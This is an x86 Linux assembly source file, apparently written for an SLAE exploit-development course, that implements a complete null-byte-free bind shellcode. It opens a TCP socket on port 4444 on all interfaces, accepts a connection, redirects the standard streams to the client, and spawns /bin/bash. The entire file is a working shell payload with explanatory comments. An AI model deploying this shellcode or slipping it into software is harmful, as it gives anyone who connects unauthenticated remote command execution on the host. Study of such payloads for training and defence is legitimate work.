; Filename: bind_shellcode.nasm
; Author: Kunal Pachauri
; SLAE-9237

global _start ; Making the Entry point accessible 

section .text
_start: ; Entry Point

; Creating Socket
        ; socketcall syscall number 102
        ; int call number for SYS_SOCKET 1

        ; Saving syscall number in EAX
        xor eax, eax
        mov al, 102 

        ; Saving int call in bl to prevent nulls
        xor ebx, ebx
        mov bl, 1

        ; sfd = socket(AF_INET, SOCK_STREAM, 0);
        ; Pushing the arguments in stack in Reverse Order
        xor edx, edx    ; Making EDX 0 to push into stack
        push edx        ; Pushing third argument first
        push byte 1     ; Pushing Constant value of SOCK_STREAM
        push byte 2     ; Pushing Contant value of AF_INET

        ; Second argument of socketcall must point to address containing the arguments i.e ESP
        mov ecx, esp    

        ; Performing the syscall
        int 0x80

        ; Saving the returned socket file descriptor in EDI from EAX
        mov edi, eax

; Binding the Socket
	; socketcall syscall number 102
	; SYS_BIND 2
	

	; Pushing the arguments in Stack in reverse order
	; Since we want to bind to all interfaces, we need to push 0 for  my_addr.sin_addr.s_addr = INADDR_ANY;
	xor ebx, ebx
	push ebx

	;  my_addr.sin_port = htons(port); 
	;  We need to push the port number (4444) in hex (0x115C) next
	push word 0x5C11 ; In little endian format

	;  Now we need to push the family of socket i.e AF_INET represented by 2 
	push word 2

	; Let us now store the address of our socket structure in some register, lets say EBX
	mov ebx, esp

	; Pushing the length of our socket structure
	push byte 16
	
	; Now pushing the address pointed to our structure that we stored in EDX
	push ebx

	; Lastly we need to push the socket file descriptor we stored in EDI
	push edi

	; Now EBX should contain 2 for SYS_BIND and ECX should contain the address to our parameters pointed by ESP
	xor ebx, ebx
	xor eax, eax
	mov al, 102
	mov bl, 2
	mov ecx, esp
	int 0x80


; Listening on the created socket
	; Pushing backlog as 0
	xor edx, edx
	push edx

	;Pushing Socket File Descriptor
	push edi

	; Setting up registers for syscall
	xor ebx, ebx
	mul ebx
	mov al, 102
	mov bl, 4
	mov ecx, esp ; Pointer to arguments
	int 0x80


; Accepting Incoming Connections
	; SYS_ACCEPT is having constant value 5
	; Since we dont need second and third arguments for our pupose, we'll start by pushing NULL in stack
	xor edx, edx
	push edx
	push edx

	; Pushing Socket File Desriptor i.e the first argument
	push edi

	; Setting up registers for syscall
	xor ebx, ebx
	mul ebx
	mov al, 102
	mov bl, 5
	; Pointing ECX to address containing parameters i.e ESP
	mov ecx, esp
	int 0x80 ; Performing the syscall 	



; Redirecting STDIN, STDOUT and STDERR to client file descriptor
	; int dup2(int oldfd, int newfd); duplicates a file descriptor
	; First saving the obtainted clientfd in EBX
	xor ebx, ebx
	mov ebx, eax

	; constant values for STDERR -> 2, STDOUT -> 1, STDIN -> 1
	xor ecx, ecx
	mov cl, 2

	; Looping to duplicate all streams to clientfd
redirect:
	;Pushing syscall of dup2 in EAX
	xor eax, eax
	mov al, 63
	; EBX already contains clientfd
	int 0x80
	dec ecx
	; Jump short if not signed
	jns redirect


; Spawning a shell using execve
	; SYSCALL for Execve is 11
	; execve("/bin/bash", NULL, NULL);
	; Pushing  null first
	xor eax, eax
	push eax
	
	; Pushing /bin////bash in reverse order
	push 0x68736162
	push 0x2f2f2f2f
	push 0x6e69622f

	; Setting up registers to perform syscall
	mov ebx, esp
	mov ecx, eax
	mov edx, eax
	mov al, 11
	int 0x80
